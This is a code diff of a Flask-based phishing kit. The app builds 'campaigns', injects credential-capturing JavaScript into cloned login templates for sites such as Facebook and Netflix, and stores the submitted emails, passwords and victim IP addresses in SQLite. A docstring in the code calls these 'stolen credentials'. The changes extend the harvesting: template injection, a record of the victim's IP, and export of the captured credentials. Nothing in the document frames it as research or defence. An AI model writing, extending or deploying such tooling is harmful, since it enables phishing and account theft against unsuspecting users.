@@ -5,7 +5,7 @@ import sqlite3
 from datetime import datetime
 from flask_cors import CORS
 from flask import Flask, render_template, request, redirect, jsonify
-from utils.html_manipulation import create_js_script
+from utils.html_manipulation import create_js_script, add_script_to_html
 from utils.date_and_time import get_current_date
 app = Flask(__name__)
 CORS(app)
@@ -80,7 +80,7 @@ def create_campaigns_db(user_id, campaign_name, template=''):
                 name TEXT,
                 date_created DATE,
                 time_created TIME,
-                template TEXT DEFAULT {template}
+                template TEXT DEFAULT "{template}"
             )
         """)
 
@@ -97,12 +97,10 @@ def create_campaigns_db(user_id, campaign_name, template=''):
         
         return db_path
         
-    except sqlite3.DatabaseError as e:
-        print(f"Database error: {e}")
-    except OSError as e:
-        print(f"File system error: {e}")
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        print(template)
+        print(f"[Create Campaigns DB] : Error in creating campaign\n{e}")
+
     finally:
         # Ensure that the connection is closed if it was opened
         if 'conn' in locals():
@@ -146,16 +144,25 @@ def fetch_campaigns(user_id):
     conn.close()
     return campaigns
 
+
 def fetch_campaign_data(db_path):
-    """Fetch content from a specific campaign database."""
+    """Fetch content from a specific campaign database and return as a list of dictionaries."""
     conn = sqlite3.connect(db_path)
     cursor = conn.cursor()
 
+    # Fetch column names
+    cursor.execute("PRAGMA table_info(credentials)")
+    columns = [column[1] for column in cursor.fetchall()]  # Extract column names
+
+    # Fetch all rows
     cursor.execute("SELECT * FROM credentials")
     campaigns = cursor.fetchall()
 
     conn.close()
-    return campaigns
+
+    # Convert to list of dictionaries
+    return [dict(zip(columns, row)) for row in campaigns]
+
 
 def remove_db_file(file_name):
     if os.path.exists(file_name):
@@ -217,7 +224,6 @@ def get_campaign():
         
 
     campaign_data = fetch_campaign_data(db_path)
-        
     campaigns_with_data = {
         "name": campaign_name,
         "data": campaign_data
@@ -230,18 +236,27 @@ def get_campaign_script():
     data = request.json
     user_id = str(data.get("user_id"))
     campaign_name = str(data.get("campaign_id"))
+    template = str(data.get("template"))
 
     db_path = os.path.join(USERS_DIR, str(user_id), DBS_DIR, f'{campaign_name}.db')
     
     if not os.path.exists(db_path):
         return jsonify({"message": "User database folder not found"}), 404
-        
 
     campaign_js_script = create_js_script(user_id, campaign_name) 
- 
+
+    if template:
+        html_page = add_script_to_html(
+            html_path=os.path.join(TEMPLATES_DIR, template),
+            script=campaign_js_script
+        )
+        script_to_send = html_page
+    else:
+        script_to_send = campaign_js_script
+
     return jsonify({
             "message": "Campaign created successfully", 
-            "js": campaign_js_script
+            "js": script_to_send
         }), 200
         
 @app.route('/campaigns/create', methods=['POST'])
@@ -290,12 +305,17 @@ def campaign_page(user_id, campaign_name):
     data = request.json
 
     if request.method == 'POST':
-        username = data['email']
-        password = data['password']
+        username  = data['email']
+        password  = data['password']
+        ip        = data['ip']
 
         if username and password:
-            print(username, password)
-            log_credentials(campaign_db_path, "Facebook", username, password)     
+            log_credentials(
+                db=campaign_db_path, 
+                page="Facebook", 
+                username=username, 
+                password=password,
+                ip=ip)     
         
     return "True", 200
 
@@ -355,9 +375,8 @@ def netflix():
 
     return render_template('netflix.html')
 
-def log_credentials(db, page, username, password):
+def log_credentials(db, page, username, password, ip):
     """Log stolen credentials into SQLite database"""
-    ip = request.remote_addr
     user_agent = request.headers.get('User-Agent')
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
